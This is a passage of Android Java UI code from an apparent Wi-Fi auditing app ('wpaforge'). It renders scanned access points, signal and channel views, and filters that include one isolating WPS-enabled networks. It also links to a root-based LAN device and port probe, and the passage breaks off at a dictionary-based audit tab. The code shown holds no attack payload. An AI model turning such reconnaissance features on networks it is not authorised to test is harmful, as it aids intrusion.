        reconSub.setText(L.s("探测当前 WiFi 网段里的设备与开放端口（需 root）",
                "Probe devices and open ports on the current WiFi subnet (root)"));
        reconSub.setTextSize(AmberTheme.FS_LABEL);
        reconSub.setTextColor(AmberTheme.TEXT_FAINT);
        reconSub.setLineSpacing(px(3), 1f);
        LinearLayout.LayoutParams rslp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rslp.topMargin = px(3);
        reconRow.addView(reconSub, rslp);

        reconRow.setOnClickListener(v -> {
            try {
                startActivity(new android.content.Intent(this,
                        io.github.wlmosv_png.wpaforge.ui.LanProbeActivity.class));
            } catch (Throwable t) {
                Toast.makeText(this, "无法打开: " + t.getMessage(),
                        Toast.LENGTH_SHORT).show();
            }
        });
        LinearLayout.LayoutParams rclp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rclp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(reconCard, rclp);

        // ③ 信号分布
        pageObserve.addView(sectionLabel(L.s("信号分布", "Signal distribution")));
        LinearLayout barsCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        signalBoard = new LinearLayout(this);
        signalBoard.setOrientation(LinearLayout.VERTICAL);
        barsCard.addView(signalBoard);
        LinearLayout.LayoutParams bcp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        bcp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(barsCard, bcp);

        // ④ 信道占用：横向条，一眼看出哪个信道空、哪个挤
        pageObserve.addView(sectionLabel(L.s("信道占用", "Channel occupancy")));
        LinearLayout chanCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        channelBars = new ChannelBars(this);
        chanCard.addView(channelBars, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        LinearLayout.LayoutParams ccp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        ccp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(chanCard, ccp);

        // 建议卡：标题单独一行（琥珀小字），正文才是建议内容
        LinearLayout adviceBox = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        adviceTitle = AmberTheme.label(this, L.s("信道建议", "CHANNEL ADVICE"));
        adviceTitle.setTextColor(ACCENT);
        adviceBox.addView(adviceTitle);
        adviceCard = new TextView(this);
        adviceCard.setTextSize(AmberTheme.FS_BODY);
        adviceCard.setTextColor(TEXT);
        adviceCard.setLineSpacing(px(5), 1f);
        LinearLayout.LayoutParams atlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        atlp.topMargin = px(6);
        adviceBox.addView(adviceCard, atlp);
        adviceBox.setVisibility(View.GONE);
        LinearLayout.LayoutParams alp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        alp.bottomMargin = px(AmberTheme.GAP_CARD);
        adviceBox.setLayoutParams(alp);
        adviceBoxRef = adviceBox;
        pageObserve.addView(adviceBox);

        // ⑤ 本机已存 WiFi：一行卡片，点开看详情
        pageObserve.addView(sectionLabel(L.s("本机已存 WiFi", "Saved Wi-Fi on this device")));
        savedWifiCard = new TextView(this);
        savedWifiCard.setTextSize(AmberTheme.FS_BODY);
        savedWifiCard.setTextColor(TEXT);
        savedWifiCard.setLineSpacing(px(5), 1f);
        savedWifiCard.setBackground(roundBgStroked(AmberTheme.CARD, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        savedWifiCard.setPadding(px(AmberTheme.PAD_H), px(AmberTheme.PAD_V),
                px(AmberTheme.PAD_H), px(AmberTheme.PAD_V));
        LinearLayout.LayoutParams swlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        swlp.bottomMargin = px(AmberTheme.GAP_CARD);
        savedWifiCard.setLayoutParams(swlp);
        savedWifiCard.setOnClickListener(v -> showSavedWifi());
        pageObserve.addView(savedWifiCard);
        updateSavedWifiCard();

        // ⑥ 发现网络
        pageObserve.addView(sectionLabel(L.s("发现网络", "Networks found")));

        // 筛选行
        HorizontalScrollView filterBar = new HorizontalScrollView(this);
        filterBar.setHorizontalScrollBarEnabled(false);
        LinearLayout fb = new LinearLayout(this);
        fb.setOrientation(LinearLayout.HORIZONTAL);
        fb.setPadding(0, 0, 0, px(10));
        fb.addView(filterChip(L.s("全部", "All"), FILTER_ALL));
        fb.addView(filterChip(L.s("加密", "Secured"), FILTER_SECURE));
        fb.addView(filterChip(L.s("开放", "Open"), FILTER_OPEN));
        fb.addView(filterChip(L.s("隐藏 SSID", "Hidden SSID"), FILTER_HIDDEN));
        // WPS 专项：wpsSupported 一直在解析但从没展示过。
        // 这个筛选把开了 WPS 的 AP 单独列出来。
        fb.addView(filterChip("WPS", FILTER_WPS));
        filterBar.addView(fb);
        pageObserve.addView(filterBar);
        renderFilterChips();

        netList = new LinearLayout(this);
        netList.setOrientation(LinearLayout.VERTICAL);
        pageObserve.addView(netList);

        // 立即渲染一遍缓存（回到该页时不至于空白）
        renderRecords(lastRecords);
        if (scanner != null) {
            observeNotice.setVisibility(View.GONE);
            scanner.start();
        }
    }

    private static final int FILTER_ALL = 0, FILTER_SECURE = 1,
            FILTER_OPEN = 2, FILTER_HIDDEN = 3, FILTER_WPS = 4;
    private int netFilter = FILTER_ALL;
    private LinearLayout filterRow;
    /** 筛选片集合（下标与 {@link #filterChipModes} 对齐，用于刷新选中态）。 */
    private final java.util.List<TextView> filterChips = new java.util.ArrayList<>();
    private final java.util.List<Integer> filterChipModes = new java.util.ArrayList<>();
    /** 信道建议卡的容器（有建议才显示）与它的标题。 */
    private LinearLayout adviceBoxRef;
    private TextView adviceTitle;

    /**
     * 筛选片。选中态＝实心琥珀 + 深色字；未选中＝暗底 + 描边 + 弱字。
     *
     * <p>改版前这里没有任何选中反馈：点了「开放」之后片子长得一模一样，
     * 用户只能靠列表内容猜当前生效的是哪个筛选。
     */
    private TextView filterChip(String label, int mode) {
        TextView t = new TextView(this);
        t.setText(label);
        t.setTextSize(AmberTheme.FS_BODY);
        t.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        t.setPadding(px(14), px(9), px(14), px(9));
        t.setOnClickListener(v -> {
            netFilter = mode;
            renderFilterChips();
            renderRecords(lastRecords);
        });
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.rightMargin = px(8);
        t.setLayoutParams(lp);
        filterChips.add(t);
        filterChipModes.add(mode);
        return t;
    }

    /** 按当前 netFilter 刷新筛选片外观。 */
    private void renderFilterChips() {
        for (int i = 0; i < filterChips.size(); i++) {
            TextView t = filterChips.get(i);
            boolean on = filterChipModes.get(i) == netFilter;
            t.setTextColor(on ? ON_ACCENT : AmberTheme.TEXT_DIM);
            t.setBackground(on
                    ? io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(
                            ACCENT, dp(AmberTheme.RADIUS_CHIP))
                    : io.github.wlmosv_png.wpaforge.ui.UiKit.rippleStroked(
                            AmberTheme.CARD_2, BTN_2ND_EDGE, dp(AmberTheme.RADIUS_CHIP), dp(0.8f)));
        }
    }

    private boolean passFilter(NetRecord r) {
        switch (netFilter) {
            case FILTER_WPS:
                return r.wpsSupported;
            case FILTER_SECURE:
                return r.security != NetRecord.Security.OPEN
                        && r.security != NetRecord.Security.WEP;
            case FILTER_OPEN:
                return r.security == NetRecord.Security.OPEN
                        || r.security == NetRecord.Security.WEP;
            case FILTER_HIDDEN:
                return r.isHidden();
            default:
                return true;
        }
    }

    /**
     * 小节标题：琥珀小字 + 拉开字距。
     *
     * <p>改版前是灰色正文色，页面上六段内容连成一片，滚动时看不出"这是新的一段"。
     * 现在统一走 {@link AmberTheme} 的强调色与字号档位（五个页面共用这一个方法，
     * 所以观感天然一致）。
     */
    private TextView sectionLabel(String s) {
        TextView t = new TextView(this);
        t.setText(s);
        t.setTextSize(AmberTheme.FS_LABEL);
        t.setTextColor(ACCENT);
        t.setLetterSpacing(0.16f);
        t.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        t.setPadding(px(4), px(20), 0, px(10));
        return t;
    }

    private final Scanner.Listener scanListener = new Scanner.Listener() {
        @Override
        public void onResults(List<NetRecord> records) {
            lastRecords = records;
            // 与上一次比对：刷新这件事才有信息量（新增/消失了几台）
            java.util.List<String> now = new java.util.ArrayList<>();
            for (NetRecord r : records) now.add(r.bssid);
            lastDiff = io.github.wlmosv_png.wpaforge.scan.ScanDiff.of(lastBssids, now);
            lastBssids = now;
            if (currentTab == 0) {
                renderRecords(records);
                updateRadarStatus();
            }
        }

        @Override
        public void onNotice(String message, boolean isError) {
            ui.post(() -> {
                if (observeNotice == null) return;
                observeNotice.setText(message);
                observeNotice.setTextColor(isError ? DANGER : TEXT_DIM);
                observeNotice.setVisibility(View.VISIBLE);
            });
        }
    };

    private void renderRecords(List<NetRecord> records) {
        if (radar == null || signalBoard == null || netList == null) return;

        // 应用筛选
        List<NetRecord> visible = new ArrayList<>();
        for (NetRecord r : records) {
            if (passFilter(r)) visible.add(r);
        }

        // 中心只放两个词：数字大、单位小。以前副文字带「· 最强 -41 dBm」，
        // 横向铺得太宽，会和内环的点/汇聚标撞在一起（截图里正压着）
        // 一个网络都扫不到时，把「为什么没有」说清楚：权限/Wi-Fi 关/系统限流
        // （有结果时不提限流 —— 那是噪音，用户也不该操心系统那 30 秒）
        if (records.isEmpty() && scanner != null && !scanner.lastScanAccepted()) {
            observeNotice.setText(L.s("暂时扫不到网络 · ", "No networks yet · ")
                    + scanner.scanGateLabel());
            observeNotice.setTextColor(DANGER);
            observeNotice.setVisibility(View.VISIBLE);
        }

        radar.setCenterText(String.valueOf(visible.size()), L.s("个网络", "networks"));

        // 雷达：**一 AP 一点**，半径＝信号档位（越强越靠里），**方位角＝信道**。
        // 圆盘因此是一张频谱图：上半圆 2.4G 的 14 条信道、下半圆 5G 的 4 个 UNII 组，
        // 同一扇区里点越多＝那条信道越挤。信道不变方位就不变，
        // 所以刷新时点不会乱跳（旧的写法把「按信号排序的序号」当角度，一抖就换位）。
        List<NetRecord> byStrong = new ArrayList<>(visible);
        java.util.Collections.sort(byStrong, (a, b) -> b.rssi - a.rssi);
        RadarSweep.Blip[] blips = new RadarSweep.Blip[byStrong.size()];
        for (int i = 0; i < byStrong.size(); i++) {
            NetRecord r = byStrong.get(i);
            blips[i] = new RadarSweep.Blip(r.bssid, r.channel, r.is5Ghz, r.signalLevel(),
                    r.security != NetRecord.Security.OPEN
                            && r.security != NetRecord.Security.WEP);
        }
        radar.setBlips(blips);
        renderRadarStats(visible);
        renderSignalBoard(visible);

        netList.removeAllViews();
        /*
         * 列表按 SSID 聚合展示。
         *
         * Scanner 现在返回全量 AP（同一 SSID 可能有多个 BSSID），
         * 这里把同 SSID 的合成一组，组头带 AP 个数，组内按信号降序。
         * 单 AP 场景退化成原来的平铺样子，不多一个字。
         */
        List<SsidGroup.Group> groups = SsidGroup.group(visible);
        for (SsidGroup.Group g : groups) {
            netList.addView(groupHeader(g));
            for (NetRecord r : g.members) {
                netList.addView(netRow(r));
            }
        }
        if (visible.isEmpty()) {
            LinearLayout empty = AmberTheme.emptyBox(this, dp,
                    netFilter == FILTER_ALL
                            ? emptyTextWithDiag()
                            : L.s("当前筛选下没有匹配的网络。", "No networks match the current filter."),
                    netFilter == FILTER_ALL
                            ? L.s("点上面的「全部」可清除筛选", "Tap “All” above to clear the filter")
                            : L.s("换个筛选看看", "Try another filter"));
            netList.addView(empty);
        }

        // 信道占用图：横向条比纯文字更直观，直接替换掉原来的文字建议
        ChannelAnalyzer.Report rep = ChannelAnalyzer.analyze(records);
        if (channelBars != null) channelBars.setReport(rep);
        renderChannelAdvice(rep);
    }

    /**
     * 信道建议卡。
     *
     * ChannelAnalyzer 早就算出 recommended24 / recommended5，但结果只喂给了
     * ChannelBars 画图 —— 图上那条绿色高亮没有任何文字说明，用户得自己悟
     * "绿的是最空的"。这里把结论直白讲出来：换哪条、当前那条有多挤。
     *
     * 某频段一个 AP 都没有时不显示对应行，不用"无数据"占位。
     */
    private void renderChannelAdvice(ChannelAnalyzer.Report rep) {
        if (adviceCard == null || adviceBoxRef == null) return;
        if (rep == null) {
            adviceBoxRef.setVisibility(View.GONE);
            return;
        }

        StringBuilder sb = new StringBuilder();

        int shown = 0;
        if (rep.recommended24 > 0) {
            sb.append(L.s("2.4G 建议 ", "2.4G -> "))
              .append("ch").append(rep.recommended24)
              .append("  ").append(loadHint(rep.stats24, rep.recommended24))
              .append('\n');
            shown++;
        }
        if (rep.recommended5 > 0) {
            sb.append(L.s("5G 建议 ", "5G -> "))
              .append("ch").append(rep.recommended5)
              .append("  ").append(loadHint(rep.stats5, rep.recommended5))
              .append('\n');
            shown++;
        }

        if (shown == 0) {
            adviceBoxRef.setVisibility(View.GONE);
            return;
        }

        sb.append(L.s("(改路由器信道后重扫，占用会变)",
                "(Rescan after changing your router channel)"));

        adviceCard.setText(sb.toString().trim());
        adviceBoxRef.setVisibility(View.VISIBLE);
    }

    /** 某信道的拥挤度描述 */
    private String loadHint(List<ChannelAnalyzer.ChannelStat> stats, int channel) {
        if (stats == null) return "";
        for (ChannelAnalyzer.ChannelStat st : stats) {
            if (st.channel == channel) {
                if (st.apCount <= 0) return L.s("无占用", "empty");
                return L.f("%d 个 AP", "%d APs", st.apCount);
            }
        }
        return "";
    }

    /**
     * SSID 组头。只有一个 AP 时返回零高度空 View（退化成原平铺列表）；
     * 多 AP 时显示 "名称 · N 个 AP · 跨 M 个信道 · 信号差 X dB"。
     */
    /**
     * SSID 组头。只有一个 AP 时返回零高度空 View（退化成原平铺列表）；
     * 多 AP 时显示 "名称 · N 个 AP · 跨 M 个信道 · 信号差 X dB"。
     *
     * <p>改版后上方加一条极淡分隔线：同 SSID 的多 AP 与前后条目分开，
     * 长列表里更容易看出"这一组到哪儿结束"。
     */
    private View groupHeader(SsidGroup.Group g) {
        if (!g.isMesh()) return new TextView(this);

        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        bp.topMargin = px(12);
        bp.bottomMargin = px(6);
        box.setLayoutParams(bp);

        box.addView(AmberTheme.divider(this, dp));

        TextView t = new TextView(this);
        StringBuilder sb = new StringBuilder(g.ssid);
        sb.append("  ").append(L.f("%d 个 AP", "%d APs", g.size()));
        if (g.distinctChannels() > 1) {
            sb.append(" · ").append(L.f("跨 %d 个信道", "%d channels", g.distinctChannels()));
        }
        int spread = g.best.rssi - g.worstRssi();
        if (spread >= 10) {
            sb.append(" · ").append(L.f("信号差 %d dB", "delta %d dB", spread));
        }
        t.setText(sb.toString());
        t.setTextSize(AmberTheme.FS_BODY);
        t.setTextColor(ACCENT);
        t.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        t.setPadding(px(4), px(6), 0, 0);
        box.addView(t);
        return box;
    }

    /**
     * 观测页"没扫到网络"时展示的文案。
     *
     * 不再是干巴巴一句"还没扫描到" —— 而是把 Scanner 记下的真实原因
     * 和特权通道（root）的结果一起摊开，用户一眼能看出
     * 是权限问题、WiFi 没开、还是系统节流。
     */
    private String emptyTextWithDiag() {
        String base = L.s("还没扫描到网络。请确认「定位」开关已打开、WiFi 已开启、权限已授予。",
                "No networks found. Check that Location is on, Wi-Fi is on, and permissions are granted.");
        if (scanner == null) return base;

        StringBuilder sb = new StringBuilder(base);
        String d = scanner.lastDiagnostic();
        if ("LOCATION_OFF".equals(d)) {
            sb.append(L.s("  定位开关没打开 —— 扫描为空最常见的原因，权限给了也没用，请下拉通知栏打开「定位」。",
                    "  Location is off - the most common cause of an empty scan; permissions alone are not enough."));
        }
        if (d != null && !d.isEmpty()) {
            sb.append("\n\n").append(L.s("诊断: ", "Diagnostic: ")).append(d);
        }
        String priv = scanner.privilegedDiagnostic();
        if (priv != null && !priv.isEmpty()) {
            sb.append("\n");
            if ("PRIV_UNAVAILABLE".equals(priv)) {
                sb.append(L.s("系统通道不可用：本机没有可用的 root（判定依赖 su + cmd wifi）。",
                        "System channel unavailable: no working root (verdicts need su + cmd wifi)."));
            } else if ("PRIV_EMPTY".equals(priv)) {
                sb.append(L.s("系统通道可用，但系统本身也没有扫描数据。",
                        "The system channel works, but the system itself has no scan data."));
            } else {
                sb.append(priv);
            }
        }
        return sb.toString();
    }

    /**
     * 信号分布板（替代原来那根单调柱状图）。
     *
     * <h3>为什么换掉柱状图</h3>
     * 原来那根「按信号排序的阶梯」只有形状、没有名字：36 根柱子长得一模一样，
     * 用户看不出哪根是谁 —— 既不构成"分布"的概念，也看不到具体 WiFi。现在给两件事：
     * <ol>
     *   <li><b>五档统计</b>：强/弱各多少台，这才是"分布"；</li>
     *   <li><b>最强 10 台</b>：名字 + 强度条 + dBm，具体是哪个 WiFi 一目了然，
     *       条的颜色与雷达上的点同源（同一个网络两处一个色）。</li>
     * </ol>
     * 其余网络在下方「发现网络」逐行列出，这里不重复堆一遍。
     */
    private void renderSignalBoard(List<NetRecord> visible) {
        if (signalBoard == null) return;
        signalBoard.removeAllViews();
        if (visible == null || visible.isEmpty()) {
            signalBoard.addView(AmberTheme.centeredHint(this,
                    L.s("暂无扫描结果", "No scan results yet")));
            return;
        }

        int[] bands = new int[5];
        for (NetRecord r : visible) {
            bands[Math.max(0, Math.min(4, r.signalLevel()))]++;
        }
        String[] names = {L.s("很弱", "Very weak"), L.s("偏弱", "Weak"), L.s("一般", "Fair"),
                L.s("良好", "Good"), L.s("极强", "Excellent")};
        LinearLayout bandRow = new LinearLayout(this);
        bandRow.setOrientation(LinearLayout.HORIZONTAL);
        for (int lv = 4; lv >= 0; lv--) {
            TextView chip = new TextView(this);
            chip.setText(names[lv] + " " + bands[lv]);
            chip.setTextSize(AmberTheme.FS_LABEL);
            chip.setTextColor(AmberTheme.signalColor(lv));
            chip.setPadding(px(9), px(4), px(9), px(4));
            chip.setBackground(roundBg(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            lp.rightMargin = px(6);
            bandRow.addView(chip, lp);
        }
        signalBoard.addView(bandRow);

        List<NetRecord> top = new ArrayList<>(visible);
        java.util.Collections.sort(top, (a, b) -> b.rssi - a.rssi);
        int shown = Math.min(10, top.size());
        for (int i = 0; i < shown; i++) {
            signalBoard.addView(signalBoardRow(top.get(i)));
        }
        if (top.size() > shown) {
            TextView more = new TextView(this);
            more.setText(L.f("共 %d 台 · 其余 %d 台见下方「发现网络」",
                    "%d APs · the other %d are listed under Networks found",
                    top.size(), top.size() - shown));
            more.setTextSize(AmberTheme.FS_LABEL);
            more.setTextColor(AmberTheme.TEXT_FAINT);
            more.setPadding(0, px(9), 0, 0);
            signalBoard.addView(more);
        }
    }

    /** 分布板的一行：名字 + 强度条 + dBm。 */
    private View signalBoardRow(NetRecord r) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rlp.topMargin = px(8);
        row.setLayoutParams(rlp);

        TextView name = new TextView(this);
        name.setText(r.displayName());
        name.setTextSize(AmberTheme.FS_BODY);
        name.setTextColor(TEXT);
        name.setSingleLine(true);
        name.setEllipsize(TextUtils.TruncateAt.END);
        row.addView(name, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1.1f));

        // 条长按**档位**取（与雷达上那道环一一对应），不是连续比例 ——
        // 实测环境里大多数 AP 都在 -40~-60，连续比例会让所有条看起来一样长。
        int level = r.signalLevel();
        FrameLayout track = new FrameLayout(this);
        track.setBackground(roundBg(AmberTheme.SUNKEN, 4f));
        View fill = new View(this);
        fill.setBackground(roundBg(AmberTheme.signalColor(level), 4f));
        track.addView(fill, new FrameLayout.LayoutParams(
                px((int) (10 + 82 * (level + 1) / 5f)), ViewGroup.LayoutParams.MATCH_PARENT));
        LinearLayout.LayoutParams tlp = new LinearLayout.LayoutParams(px(94), px(9));
        tlp.leftMargin = px(8);
        tlp.rightMargin = px(8);
        row.addView(track, tlp);

        TextView dbm = new TextView(this);
        dbm.setText(r.rssi + "");
        dbm.setTextSize(AmberTheme.FS_LABEL);
        dbm.setTextColor(AmberTheme.signalColor(r.signalLevel()));
        dbm.setTypeface(Typeface.MONOSPACE);
        dbm.setGravity(Gravity.END);
        row.addView(dbm, new LinearLayout.LayoutParams(px(38),
                ViewGroup.LayoutParams.WRAP_CONTENT));
        return row;
    }

    /**
     * 单个网络一行（卡片样式）。
     *
     * <h3>改了什么</h3>
     * <ul>
     *   <li>左侧多一条 3dp 的**信号色条** —— 列表能竖着扫一眼看强弱；</li>
     *   <li>右侧 dBm 用等宽字体（数字对齐、可比较），等级文字降为辅助；</li>
     *   <li>安全类型改成胶囊：无保护＝红胶囊，已加密＝绿胶囊，扫列表时不再靠读字。</li>
     * </ul>
     * <p>展示的信息与改版前**逐项相同**（BSSID / 信道 / 频段 / 安全 / WPS / 厂商 /
     * 估算距离 / 带宽代际），一个字段都没少。
     */
    /**
     * 单个网络一行（卡片样式）。
     *
     * <h3>第二次修正：内容不许被截断</h3>
     * 第一版把地址与厂商/距离全塞进一行再 ellipsize，结果长 SSID 或长厂商名
     * 会变成 "WP…"（用户截图指出）。现在按信息层级拆开：
     * <ul>
     *   <li><b>名称</b>一行（可以截断 —— 名字本身长，右侧还有固定宽度指标区）；</li>
     *   <li><b>地址行</b>：MAC · 信道 · 频段（等宽，一行放得下）；</li>
     *   <li><b>信息行</b>：带宽代际 · WPS · 厂商 · 估算距离，**允许换行不截断**；</li>
     *   <li>右侧指标区固定宽度（dBm / 等级 / 安全胶囊），所以左边永远不会被挤窄。</li>
     * </ul>
     * 展示字段与最初版本**逐项相同**，只是换了排布方式。
     */
    private View netRow(NetRecord r) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setBackground(roundBgStroked(AmberTheme.CARD, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        row.setPadding(px(14), px(13), px(12), px(13));
        LinearLayout.LayoutParams rp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rp.bottomMargin = px(7);
        row.setLayoutParams(rp);

        // 信号色条：等级色，一眼看强弱
        View sigBar = new View(this);
        sigBar.setBackground(roundBgStatic(AmberTheme.signalColor(r.signalLevel()), 2f));
        LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(
                px(3), ViewGroup.LayoutParams.MATCH_PARENT);
        slp.rightMargin = px(12);
        row.addView(sigBar, slp);

        // 左列：名称 / 地址 / 其余信息
        LinearLayout left = new LinearLayout(this);
        left.setOrientation(LinearLayout.VERTICAL);

        TextView name = new TextView(this);
        name.setText(r.displayName());
        name.setTextSize(AmberTheme.FS_TITLE);
        name.setTextColor(TEXT);
        name.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        name.setSingleLine(true);
        name.setEllipsize(TextUtils.TruncateAt.END);
        left.addView(name);

        TextView addr = new TextView(this);
        addr.setText(r.bssid + "   ch" + r.channel + (r.is5Ghz ? " · 5G" : " · 2.4G"));
        addr.setTextSize(FS_TINY);
        addr.setTextColor(AmberTheme.TEXT_DIM);
        addr.setTypeface(Typeface.MONOSPACE);
        addr.setSingleLine(true);
        LinearLayout.LayoutParams alp2 = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        alp2.topMargin = px(4);
        left.addView(addr, alp2);

        // 信息行：带宽代际（琥珀）+ 其余（次级色）；**可换行，不截断**
        ScanDetail sd = scanner == null ? ScanDetail.UNKNOWN : scanner.detailOf(r);
        String vendor = io.github.wlmosv_png.wpaforge.scan.OuiLookup.isRandomized(r.bssid)
                ? L.s("随机 MAC", "random MAC")
                : io.github.wlmosv_png.wpaforge.scan.OuiLookup.vendor(this, r.bssid);
        StringBuilder meta = new StringBuilder();
        if (!sd.isEmpty()) meta.append(sd.label());
        if (r.wpsSupported) meta.append(meta.length() > 0 ? "  ·  " : "").append("WPS");
        if (vendor != null && !vendor.isEmpty()) {
            meta.append(meta.length() > 0 ? "  ·  " : "").append(vendor);
        }
        if (!r.isHidden() && r.estimatedDistanceMeters() > 0) {
            meta.append(meta.length() > 0 ? "  ·  " : "")
                    .append("≈").append(r.estimatedDistanceMeters()).append("m");
        }
        if (meta.length() > 0) {
            TextView info = new TextView(this);
            android.text.SpannableString sp =
                    new android.text.SpannableString(meta.toString());
            if (!sd.isEmpty()) {
                sp.setSpan(new android.text.style.ForegroundColorSpan(ACCENT), 0,
                        sd.label().length(), android.text.Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            }
            info.setText(sp);
            info.setTextSize(FS_TINY);
            info.setTextColor(AmberTheme.TEXT_DIM);
            info.setTypeface(Typeface.MONOSPACE);
            info.setSingleLine(false);          // 允许折行 —— 宁可多一行，不可截断
            info.setMaxLines(2);
            LinearLayout.LayoutParams mlp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            mlp.topMargin = px(3);
            left.addView(info, mlp);
        }

        row.addView(left, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        // 右列：固定宽度（dBm / 等级 / 安全胶囊）
        LinearLayout right = new LinearLayout(this);
        right.setOrientation(LinearLayout.VERTICAL);
        right.setGravity(Gravity.END);
        right.setMinimumWidth(px(76));

        TextView dbm = new TextView(this);
        dbm.setText(r.rssi + " dBm");
        dbm.setTextSize(12.5f);
        dbm.setTextColor(AmberTheme.signalColor(r.signalLevel()));
        dbm.setTypeface(Typeface.MONOSPACE);
        dbm.setGravity(Gravity.END);
        dbm.setSingleLine(true);
        right.addView(dbm);

        TextView lvl = new TextView(this);
        lvl.setText(levelText(r.signalLevel()));
        lvl.setTextSize(FS_TINY);
        lvl.setTextColor(AmberTheme.TEXT_DIM);
        lvl.setGravity(Gravity.END);
        right.addView(lvl);

        TextView sec = new TextView(this);
        boolean weak = r.security == NetRecord.Security.OPEN
                || r.security == NetRecord.Security.WEP;
        sec.setText(weak ? L.s("无保护", "No protection") : securityLabel(r.security));
        sec.setTextSize(FS_TINY);
        sec.setTextColor(weak ? DANGER : OK_GREEN);
        sec.setGravity(Gravity.CENTER);
        sec.setBackground(roundBg(weak ? AmberTheme.DANGER_SOFT_BG : AmberTheme.OK_BG,
                AmberTheme.RADIUS_CHIP));
        sec.setPadding(px(8), px(3), px(8), px(3));
        LinearLayout.LayoutParams sclp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        sclp.topMargin = px(6);
        right.addView(sec, sclp);

        row.addView(right);
        return row;
    }

    /** RSSI → 档位（与 NetRecord.signalLevel 同一把尺子；UI 侧小工具，不动业务类）。 */
    private static int levelOfRssi(int rssi) {
        if (rssi >= -50) return 4;
        if (rssi >= -60) return 3;
        if (rssi >= -70) return 2;
        if (rssi >= -80) return 1;
        return 0;
    }

    private String levelText(int lv) {
        switch (lv) {
            case 4: return L.s("极强", "Excellent");
            case 3: return L.s("良好", "Good");
            case 2: return L.s("一般", "Fair");
            case 1: return L.s("偏弱", "Weak");
            default: return L.s("很弱", "Very weak");
        }
    }

    private String securityLabel(NetRecord.Security s) {
        switch (s) {
            case OPEN: return L.s("开放", "Open");
            case WEP: return L.s("WEP(已过时)", "WEP (deprecated)");
            case WPA: return "WPA";
            case WPA2: return "WPA2";
            case WPA3: return "WPA3(SAE)";
            case WPA2_WPA3: return "WPA2/3(SAE)";
            case OWE: return "OWE";
            default: return L.s("未知", "Unknown");
        }
    }

    // ---------------- 审计页 ----------------

    /**
     * 审计页 —— 2026-10-24 重做。
     *
     * <h3>为什么重做</h3>
     * 上一版是四五个占满宽度的胶囊按钮竖着排：每个都像主操作，按钮墙把页面撑得
     * 很长，而且「评估」这种一次性的小动作也用整行大按钮，层级混乱（用户反馈
     * "感觉这个还不够软件美学"）。现在：
     * <ul>
     *   <li>字典入口改成**行式**（与设置页同一套行结构与箭头）；</li>
     *   <li>强度检查：输入框与「评估」按钮**同一行** —— 输入与动作是一件事；</li>
     *   <li>评估结果**就地显示**一行结论（与写进日志的那条结论同源同文案）；</li>
     *   <li>离线校验：说明块 + 一行入口；</li>
     *   <li>日志区改成终端卡：等宽、下沉底、带标题与空状态引导。</li>
     * </ul>
     *
     * <p>所有回调、字典来源、判定语义与文案内容**与改版前一致**。
     */
    private void buildAuditTab() {
        if (radar != null) radar.stopSpin();

        // ---------------- 字典 ----------------
